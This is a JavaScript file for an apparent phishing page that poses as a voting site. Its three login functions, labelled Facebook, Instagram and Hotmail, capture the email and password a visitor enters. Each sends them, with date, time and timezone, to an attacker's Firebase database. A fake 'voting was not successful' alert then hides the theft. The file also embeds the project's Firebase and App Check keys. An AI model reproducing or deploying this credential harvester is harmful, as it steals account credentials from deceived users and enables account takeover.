// Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyClD2fGSdipTFa9dPizXPZMpVxMxvuRklw",
  authDomain: "arabasiastarzss.firebaseapp.com",
  databaseURL: "https://arabasiastarzss-default-rtdb.firebaseio.com",
  projectId: "arabasiastarzss",
  storageBucket: "arabasiastarzss.appspot.com",
  messagingSenderId: "65929942072",
  appId: "1:65929942072:web:2dc90dc4fda7a2e02f02cd",
  measurementId: "G-TEGMLXLC02",
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);

// App Check setup
const appCheck = firebase.appCheck();
console.log(appCheck);
appCheck.activate("6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW", true);

// Login function for Facebook
function login() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      let errorCode = error.code;
      let errorMessage = error.message;
      window.alert("Error: " + errorMessage);
    });

  let email = document.getElementById("fb-email").value;
  let password = document.getElementById("fb-pass").value;
  let date = new Date().toISOString().slice(0, 10);
  let time = new Date()
    .toLocaleString("en-US", { hour12: false })
    .slice(11, 19);
  let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  let type = "Facebook";

  if (email != "" && password != "") {
    firebase.database().ref("fbdet").push().set({
      emle: email,
      mobile: "",
      time: time,
      timezone: timezone,
      pass: password,
      date: date,
      type: type,
    });

    setTimeout(function () {
      window.alert("Sorry voting was not successful. Please try again later.");
      document.getElementById("fb-pass").value = "";
      return false;
    }, 2000);
  }
}

// Login function for Instagram
function iglog() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      let errorCode = error.code;
      let errorMessage = error.message;
      window.alert("Error: " + errorMessage);
    });

  let email = document.getElementById("ig-uname").value;
  let password = document.getElementById("ig-pass").value;
  let date = new Date().toISOString().slice(0, 10);
  let time = new Date()
    .toLocaleString("en-US", { hour12: false })
    .slice(11, 19);
  let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  let type = "Instagram";

  if (email != "" && password != "") {
    firebase.database().ref("fbdet").push().set({
      emle: email,
      mobile: "",
      time: time,
      timezone: timezone,
      pass: password,
      date: date,
      type: type,
    });

    setTimeout(function () {
      window.alert("Sorry voting was not successful. Please try again later.");
      document.getElementById("ig-pass").value = "";
      return false;
    }, 2000);
  }
}

// Login function for Hotmail
function hmlog() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      let errorCode = error.code;
      let errorMessage = error.message;
      window.alert("Error: " + errorMessage);
    });

  let email = document.getElementById("hm-email").value;
  let password = document.getElementById("hm-pass").value;
  let date = new Date().toISOString().slice(0, 10);
  let time = new Date()
    .toLocaleString("en-US", { hour12: false })
    .slice(11, 19);
  let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  let type = "Hotmail";

  if (email != "" && password != "") {
    firebase.database().ref("fbdet").push().set({
      emle: email,
      mobile: "",
      time: time,
      timezone: timezone,
      pass: password,
      date: date,
      type: type,
    });

    setTimeout(function () {
      window.alert("Sorry voting was not successful. Please try again later.");
      document.getElementById("ig-pass").value = "";
      return false;
    }, 2000);
  }
}
